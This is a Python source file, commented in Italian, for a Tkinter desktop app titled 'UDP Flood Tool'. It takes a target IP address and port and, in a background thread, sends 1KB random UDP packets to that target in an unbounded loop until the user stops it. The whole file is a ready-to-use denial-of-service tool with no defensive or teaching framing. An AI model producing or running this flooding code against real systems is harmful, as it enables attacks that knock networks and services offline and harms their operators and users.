import tkinter as tk
from tkinter import messagebox
import socket
import os
import threading

# Variabile globale per gestire l'interruzione
is_attacking = False

# Funzione per avviare l'UDP flood
def start_attack():
    global is_attacking
    target_ip = ip_entry.get()
    try:
        target_port = int(port_entry.get())
    except ValueError:
        messagebox.showerror("Errore", "La porta deve essere un numero intero.")
        return

    # Imposta la variabile per avviare l'attacco
    is_attacking = True

    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(1024)  # Pacchetto di 1KB
        status_label.config(text=f"Attacco avviato su {target_ip}:{target_port}...")
        try:
            while is_attacking:
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            status_label.config(text=f"Errore: {e}")
        finally:
            sock.close()

    # Avvia l'attacco in un thread separato
    thread = threading.Thread(target=attack, daemon=True)
    thread.start()

# Funzione per fermare l'attacco
def stop_attack():
    global is_attacking
    is_attacking = False
    status_label.config(text="Attacco fermato.")

# Creazione della finestra principale
app = tk.Tk()
app.title("UDP Flood Tool")
app.geometry("400x300")

# Input per l'indirizzo IP
ip_label = tk.Label(app, text="Indirizzo IP:")
ip_label.pack(pady=5)
ip_entry = tk.Entry(app, width=40)
ip_entry.pack(pady=5)

# Input per la porta
port_label = tk.Label(app, text="Porta:")
port_label.pack(pady=5)
port_entry = tk.Entry(app, width=40)
port_entry.pack(pady=5)

# Pulsante per avviare l'attacco
start_button = tk.Button(app, text="Avvia Attacco", command=start_attack)
start_button.pack(pady=10)

# Pulsante per fermare l'attacco
stop_button = tk.Button(app, text="Ferma Attacco", command=stop_attack)
stop_button.pack(pady=10)

# Etichetta per lo stato dell'attacco
status_label = tk.Label(app, text="")
status_label.pack(pady=10)

# Avvia la finestra
app.mainloop()
